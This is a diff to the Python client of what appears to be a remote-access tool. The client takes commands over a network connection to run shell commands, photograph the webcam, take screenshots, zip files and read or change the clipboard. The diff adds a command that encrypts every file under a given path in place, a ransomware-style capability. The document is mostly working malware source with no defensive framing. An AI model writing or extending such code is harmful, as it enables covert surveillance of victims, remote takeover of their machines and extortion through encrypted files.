@@ -9,6 +9,7 @@ import math
 import zipfile
 import json
 import multiprocessing
+import hashlib
 # non-standard python libraries
 import mss
 import cv2
@@ -35,15 +36,18 @@ class Client:
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
             elif request["cmd"] == "z":
-                process = multiprocessing.Process(target=self.zip_file_or_folder, args=(self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
+                process = multiprocessing.Process(target=self.zip_file_or_folder, args=(
+                self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
             elif request["cmd"] == "w":
-                process = multiprocessing.Process(target=self.capture_camera_picture, args=(self.response, request["cam_port"], request["save_path"],))
+                process = multiprocessing.Process(target=self.capture_camera_picture,
+                                                  args=(self.response, request["cam_port"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
             elif request["cmd"] == "s":
-                process = multiprocessing.Process(target=self.capture_screenshot, args=(self.response, request["monitor"], request["save_path"],))
+                process = multiprocessing.Process(target=self.capture_screenshot,
+                                                  args=(self.response, request["monitor"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
             elif request["cmd"] == "d":
@@ -61,10 +65,16 @@ class Client:
                 process = multiprocessing.Process(target=self.edit_clipboard, args=(self.response, request["content"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
+            elif request["cmd"] == "e":
+                process = multiprocessing.Process(target=self.crypt, args=(
+                self.response, request["action"], request["open_path"], request["password"],))
+                self.handle_process(process, request["timeout"])
+                self.connection.send(self.response)
 
     def execute_command(self, response, command):
         try:
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                       stderr=subprocess.PIPE, universal_newlines=True)
             response["data"] = process.stdout.read().rstrip()
             response["error"] = process.stderr.read().rstrip()
         except UnicodeDecodeError:
@@ -150,6 +160,45 @@ class Client:
             response["data"] = ""
         else:
             response["data"] = clipboard.paste()
+
+    def crypt(self, response, action, path_to_open, password):
+        password_hash = hashlib.sha3_256(password.encode("utf8")).digest()
+        print(password_hash)
+        crypter = AESGCM(password_hash)
+        if action == "enc":
+            if os.path.isdir(path_to_open):
+                for subdir, dirs, files in os.walk(path_to_open):
+                    for filename in files:
+                        path = os.path.join(subdir, filename)
+                        with open(path, "rb") as file:
+                            data = file.read()
+                        nonce = os.urandom(12)
+                        data_enc = crypter.encrypt(nonce, data, b"")
+                        with open(path, "wb") as file:
+                            file.write(nonce + data_enc)
+            else:
+                with open(path_to_open, "rb") as file:
+                    data = file.read()
+                nonce = os.urandom(12)
+                data_enc = crypter.encrypt(nonce, data, b"")
+                with open(path_to_open, "wb") as file:
+                    file.write(nonce + data_enc)
+        elif action == "dec":
+            if os.path.isdir(path_to_open):
+                for subdir, dirs, files in os.walk(path_to_open):
+                    for filename in files:
+                        path = os.path.join(subdir, filename)
+                        with open(path, "rb") as file:
+                            data_enc = file.read()
+                        data = crypter.decrypt(data_enc[:12], data_enc[12:], b"")
+                        with open(path, "wb") as file:
+                            file.write(data)
+            else:
+                with open(path_to_open, "rb") as file:
+                    data_enc = file.read()
+                data = crypter.decrypt(data_enc[:12], data_enc[12:], b"")
+                with open(path_to_open, "wb") as file:
+                    file.write(data)
 
     def handle_process(self, process, timeout):
         process.start()
